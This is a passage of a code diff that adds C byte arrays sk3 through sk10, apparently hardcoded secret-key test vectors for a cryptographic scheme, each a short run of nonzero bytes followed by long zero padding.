++unsigned char sk3[CRYPTO_SECRETKEYBYTES] = {63, 9, 237, 205, 25, 150, 43, 189, 64, 248, 119, 152, 25, 112, 235, 253, 207, 144, 70, 238, 228, 52, 218, 211, 189, 212, 118, 112, 157, 197, 31, 9, 103, 218, 225, 248, 245, 146, 202, 163, 107, 19, 215, 211, 163, 127, 17, 241, 80, 193, 150, 168, 107, 73, 241, 172, 84, 53, 52, 18, 80, 148, 30, 247, 187, 160, 177, 67, 2, 50, 111, 128, 67, 160, 124, 198, 2, 78, 203, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
++unsigned char sk4[CRYPTO_SECRETKEYBYTES] = {235, 114, 88, 55, 113, 47, 92, 98, 43, 28, 28, 15, 233, 59, 160, 161, 100, 197, 76, 78, 199, 58, 133, 174, 156, 183, 47, 117, 112, 189, 223, 247, 172, 37, 63, 59, 28, 148, 80, 72, 44, 115, 78, 220, 116, 255, 251, 64, 132, 72, 191, 76, 161, 78, 151, 143, 221, 206, 163, 239, 15, 0, 213, 85, 247, 43, 130, 255, 75, 17, 255, 196, 255, 138, 175, 133, 94, 168, 167, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
++unsigned char sk5[CRYPTO_SECRETKEYBYTES] = {167, 29, 167, 89, 101, 156, 23, 203, 222, 237, 11, 35, 81, 89, 46, 246, 197, 156, 232, 19, 180, 202, 199, 149, 31, 8, 251, 175, 131, 194, 87, 203, 152, 149, 109, 233, 7, 191, 121, 185, 22, 207, 73, 125, 214, 12, 172, 200, 156, 224, 39, 144, 23, 83, 100, 184, 31, 58, 49, 125, 146, 53, 216, 133, 230, 237, 226, 169, 3, 27, 17, 99, 246, 55, 197, 249, 11, 63, 25, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
++unsigned char sk6[CRYPTO_SECRETKEYBYTES] = {140, 23, 89, 65, 4, 171, 48, 174, 31, 157, 6, 189, 8, 200, 9, 232, 93, 106, 148, 104, 2, 14, 83, 49, 88, 38, 231, 229, 153, 204, 122, 44, 27, 240, 200, 68, 237, 195, 53, 18, 22, 95, 111, 49, 180, 235, 229, 245, 123, 63, 222, 26, 41, 126, 72, 47, 108, 211, 135, 177, 164, 153, 208, 149, 213, 186, 75, 51, 8, 53, 1, 88, 175, 26, 32, 82, 74, 205, 94, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
++unsigned char sk7[CRYPTO_SECRETKEYBYTES] = {54, 90, 66, 2, 25, 192, 62, 141, 142, 207, 85, 9, 181, 100, 152, 254, 134, 244, 103, 145, 151, 88, 80, 58, 174, 145, 16, 192, 209, 195, 157, 175, 94, 245, 61, 172, 105, 24, 38, 132, 63, 199, 116, 18, 195, 102, 147, 129, 3, 37, 44, 240, 136, 16, 129, 123, 77, 115, 23, 65, 158, 251, 163, 37, 153, 208, 134, 249, 99, 175, 202, 178, 175, 194, 203, 239, 161, 9, 90, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
++unsigned char sk8[CRYPTO_SECRETKEYBYTES] = {189, 23, 57, 54, 199, 87, 183, 95, 80, 226, 199, 83, 182, 15, 101, 125, 156, 216, 199, 147, 255, 24, 251, 197, 105, 64, 148, 20, 126, 7, 213, 133, 48, 64, 127, 159, 81, 104, 103, 122, 169, 246, 119, 226, 127, 5, 182, 105, 176, 196, 189, 146, 1, 127, 149, 233, 106, 206, 50, 176, 37, 136, 160, 27, 2, 142, 191, 205, 49, 111, 47, 154, 213, 156, 255, 72, 115, 71, 35, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
++unsigned char sk9[CRYPTO_SECRETKEYBYTES] = {253, 94, 168, 206, 175, 189, 133, 113, 167, 118, 80, 56, 211, 138, 131, 83, 249, 119, 14, 177, 160, 137, 219, 201, 94, 131, 124, 129, 222, 253, 26, 125, 127, 215, 184, 90, 162, 11, 72, 53, 8, 141, 151, 216, 166, 185, 131, 149, 244, 42, 126, 255, 12, 50, 155, 248, 35, 52, 43, 5, 203, 22, 1, 56, 58, 246, 115, 152, 152, 126, 33, 62, 3, 10, 72, 177, 179, 10, 6, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
++unsigned char sk10[CRYPTO_SECRETKEYBYTES] = {43, 139, 117, 2, 169, 187, 153, 172, 78, 29, 254, 111, 110, 185, 135, 6, 15, 61, 125, 18, 233, 15, 135, 238, 57, 81, 198, 48, 182, 213, 230, 87, 136, 140, 48, 205, 161, 60, 128, 105, 112, 146, 174, 80, 150, 19, 177, 113, 59, 58, 194, 70, 197, 102, 236, 202, 121, 146, 196, 31, 96, 53, 181, 223, 156, 230, 8, 200, 203, 163, 136, 167, 126, 53, 49, 56, 218, 92, 116, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 